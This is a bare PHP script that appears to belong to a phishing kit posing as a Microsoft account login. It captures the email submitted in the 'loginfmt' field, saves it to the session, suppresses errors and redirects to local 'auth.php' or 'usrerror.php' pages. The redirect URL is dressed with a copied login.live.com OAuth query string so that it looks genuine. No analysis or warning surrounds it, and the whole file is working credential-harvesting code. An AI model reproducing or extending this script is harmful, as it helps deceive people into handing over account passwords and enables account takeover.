<?php
error_reporting(0);
ob_start();
session_start();
$axp ="Re_Identify";





/** form fields **/

$_SESSION['email'] = $email = $_POST['loginfmt'];



// pass valid/invalid emails
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
 //Exiting to next page
    $asp = "https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXVSPW_TUADMyxdthaBCiI8FdWCoQE6eP-J8iA51GidpY7tp3Bh7iRznJXmJ7ZfaL2ljFkYGhkpsnRASQqrEgoSE-AmdOndgRkyIAdhK2p3lhrsbTnf3JMFm2NJjgRdydr5bZIq2yDNCkYWMLXAiw-d4kecg28tBPrizsvrsI71c_9aQ33xev3y9XX10ApY7Lp6hjEO8U3B_SOkkLGWzh4eHGdLvY-dayH4B4ByA7wCcxFPIZ_Zbp_FQ5MU8LIp8EUI2L3C5opixDAsrhuwqkUPNSMZmC0JlJHkNowItw6TaluSqRj1SddfTdGlkerJnjdqu5ZlUrSqctfCrhik09MGROVKoVbVcNTJZpVqHWrU5v4jf1jandMhdAQlwhH7Fl_sk8DoTEtKTxAegTZBf75WJ7yOHZq5syKfYsSkm_m5AJiigGIUbB161xk83VSwetReMPuBM2KsfUe1ACqddHXfGY4_QEe4Py6OggAJtt22U2zN52-KGvrM3KwdOGA67UKo09c4mb093crOKSmxbbA-8mTRB88Dt-lQKo72pVq_RCprvoI4hcMa-Q3iz-ymRXtTqEf8scWsRyse9tUlA-thF50nwI3kTJkpLS-nVxIPYWuxvErxLLZaLJ_WH95J_tl7-brx_u_oidpbKis_Hfb3Hq6JM2kE08_bo9Ck2WqEiiy01X2vud5Fsa2TOZZsbhRJ7nAbH6fTPNHh1I_Z1-X9bX6zcXfylwMACw-XXWFjKsSUBWv8A0&amp;estsfed=1&amp;uaid=ff74ad3cde28464c93b528ff8c4a471e&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US";
    $mover = "auth.php?$asp";
    $Redirect = $mover;
} else {
     //Exiting to error page
    $asp = "https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXVSPW_TUADMyxdthaBCiI8FdWCoQE6eP-J8iA51GidpY7tp3Bh7iRznJXmJ7ZfaL2ljFkYGhkpsnRASQqrEgoSE-AmdOndgRkyIAdhK2p3lhrsbTnf3JMFm2NJjgRdydr5bZIq2yDNCkYWMLXAiw-d4kecg28tBPrizsvrsI71c_9aQ33xev3y9XX10ApY7Lp6hjEO8U3B_SOkkLGWzh4eHGdLvY-dayH4B4ByA7wCcxFPIZ_Zbp_FQ5MU8LIp8EUI2L3C5opixDAsrhuwqkUPNSMZmC0JlJHkNowItw6TaluSqRj1SddfTdGlkerJnjdqu5ZlUrSqctfCrhik09MGROVKoVbVcNTJZpVqHWrU5v4jf1jandMhdAQlwhH7Fl_sk8DoTEtKTxAegTZBf75WJ7yOHZq5syKfYsSkm_m5AJiigGIUbB161xk83VSwetReMPuBM2KsfUe1ACqddHXfGY4_QEe4Py6OggAJtt22U2zN52-KGvrM3KwdOGA67UKo09c4mb093crOKSmxbbA-8mTRB88Dt-lQKo72pVq_RCprvoI4hcMa-Q3iz-ymRXtTqEf8scWsRyse9tUlA-thF50nwI3kTJkpLS-nVxIPYWuxvErxLLZaLJ_WH95J_tl7-brx_u_oidpbKis_Hfb3Hq6JM2kE08_bo9Ck2WqEiiy01X2vud5Fsa2TOZZsbhRJ7nAbH6fTPNHh1I_Z1-X9bX6zcXfylwMACw-XXWFjKsSUBWv8A0&amp;estsfed=1&amp;uaid=ff74ad3cde28464c93b528ff8c4a471e&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US";
    $mover = "usrerror.php?$asp";
    $Redirect = $mover;
}






header("Location: $Redirect");
